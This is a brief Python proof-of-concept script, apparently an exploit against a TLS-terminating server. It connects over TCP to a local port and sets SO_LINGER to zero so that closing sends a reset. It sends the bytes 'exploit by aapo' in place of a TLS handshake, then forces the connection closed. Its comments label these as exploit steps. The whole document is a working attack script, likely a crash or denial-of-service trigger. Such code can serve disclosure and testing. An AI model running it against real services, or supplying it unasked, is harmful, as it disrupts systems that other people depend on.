import socket
import struct

# Connect to a server with TCP
upstream_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
upstream_socket.connect(('127.0.0.1', 12345))
# Exploit part 1: set the socket to be killed immediately when closed
upstream_socket.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
upstream_socket.setblocking(False)

# Exploit part 2: Send malicious data instead of TLS handshake and immediately force close the connection
data = b"exploit by aapo"
upstream_socket.send(data)
upstream_socket.close()
